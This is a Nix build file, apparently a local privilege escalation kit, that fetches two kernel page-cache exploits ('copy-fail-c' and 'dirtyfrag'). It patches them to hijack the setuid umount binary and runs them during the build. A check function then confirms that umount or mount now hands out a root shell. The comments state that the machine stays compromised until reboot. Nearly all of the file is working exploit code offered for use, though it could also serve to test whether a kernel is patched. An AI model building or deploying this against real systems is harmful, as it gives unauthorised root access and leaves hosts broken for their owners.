# nix-build -E 'with import <nixpkgs> { }; callPackage ./lpe.nix { }'
# then run 'mount' and you'll have root if your kernel is vulnerable
# Note that not using ZFS seems to be required as these corrupt the page cache.

{
  lib,
  pkgsStatic,
  stdenv,
  stdenvNoCC,
  fetchFromGitHub,
  bash,

  # make sure this is the same one that's in the security wrapper at /run/wrappers/bin/mount
  # same nixpkgs will suffice
  util-linux,
}:

let
  # Nice setuid that's seldom used (less than 'mount' anyway).
  target = lib.getExe' util-linux.bin "umount";

  copy-fail-c = pkgsStatic.stdenv.mkDerivation {
    pname = "copy-fail-c";
    version = "0.1";

    src = fetchFromGitHub {
      owner = "tgies";
      repo = "copy-fail-c";
      rev = "925f1a2d13f9a19297e249666ce3e40034fa87cc";
      hash = "sha256-yl915VpY9fL7W43XlZImLkZVSqOxv6VdZEuPyvUNw0A=";
    };

    postPatch = ''
      # Don't explicitly run su since we may override it with argv[1]
      substituteInPlace exploit.c \
        --replace-fail '"/bin/sh"' '"${lib.getExe' bash "sh"}"' \
        --replace-fail '"su"' 'target'
      substituteInPlace payload.c \
        --replace-fail '"/bin/sh"' '"${lib.getExe' bash "sh"}"'
    '';

    installPhase = ''
      runHook preInstall
      mkdir -p $out/bin
      cp exploit $out/bin/copyfail
      runHook postInstall
    '';
  };

  dirtyfrag = stdenv.mkDerivation {
    pname = "dirtyfrag";
    version = "0.1";

    src = fetchFromGitHub {
      owner = "V4bel";
      repo = "dirtyfrag";
      rev = "892d9a31d391b7f0fccb333855f6289507186748";
      hash = "sha256-9eO10LhzLzlVAIPIvIKCrqdoPVod1W0EjhyqaVS/R5g=";
    };

    postPatch = ''
      substituteInPlace exp.c \
        --replace-fail '/usr/bin/su' '${target}' \
        --replace-fail '"/bin/bash"' '"${lib.getExe' bash "sh"}"' \
        --replace-fail '/bin/bash' '///bin/sh' \
        --replace-fail '"bash"' '"sh"'
    '';

    buildPhase = ''
      runHook preBuild
      gcc -O0 -Wall -o exp exp.c -lutil
      runHook postBuild
    '';

    installPhase = ''
      runHook preInstall
      mkdir -p $out/bin
      cp exp $out/bin/dirtyfrag
      runHook postInstall
    '';
  };
in
stdenvNoCC.mkDerivation (finalAttrs: {
  name = "dirtyfrag";

  phases = [
    "configurePhase"
    "copyFailPhase"
  ]
  ++ lib.optionals stdenvNoCC.buildPlatform.isx86_64 [
    # Currently only works on x86_64
    "dirtyFragPhase"
  ]
  ++ [
    "fixupPhase"
  ];

  nativeBuildInputs = [
    util-linux.bin
    copy-fail-c
  ]
  ++ lib.optionals stdenvNoCC.buildPlatform.isx86_64 [
    dirtyfrag
  ];

  inherit target;

  checkTarget = ''
    checkTarget() {
      if [ $# -eq 0 ]; then
        set -- ${baseNameOf target}
      fi

      output="$({ { echo 'echo vulnerable:\ uid\ $UID && exit $?' | "$@" 2>&1; } || true; })"

      # "applet not found" in the sandbox is from the Nix-provided /bin/sh (busybox) and can happen if argv is incorrect
      if [[ "$(echo "$output" | head -n1)" =~ (^vulnerable:[[:space:]]|applet[[:space:]]not[[:space:]]found$) ]]; then
        echo "System seems vulnerable. Anything that indirectly calls $* will get a shell now." >&2
        echo "Definitely reboot if you don't want it to remain broken, the output was:" >&2
        echo "$output" >&2
        if [[ -v out ]] && [ -n "$out" ]; then
          touch $out
        fi
        exit 0
      else
        echo "Output was '$output'. Maybe the system is patched?" >&2
        echo "If you run $* afterwards and don't get a shell, you're probably OK" >&2
      fi
    }
  '';

  configurePhase = ''
    runHook preConfigure
    ${finalAttrs.checkTarget}
    mount
    runHook postConfigure
  '';

  copyFailPhase = ''
    runHook preCopyFail
    copyfail $target </dev/null || true
    checkTarget $target
    runHook postCopyFail
  '';

  dirtyFragPhase = ''
    runHook preDirtyFrag
    dirtyfrag --verbose </dev/null || true
    checkTarget $target
    runHook postDirtyFrag
  '';

  fixupPhase = ''
    runHook preFixup
    if [ ! -f $out ]; then
      echo "Tried all our tricks, nothing worked." >&2
      exit 1
    fi
    runHook postFixup
  '';
})
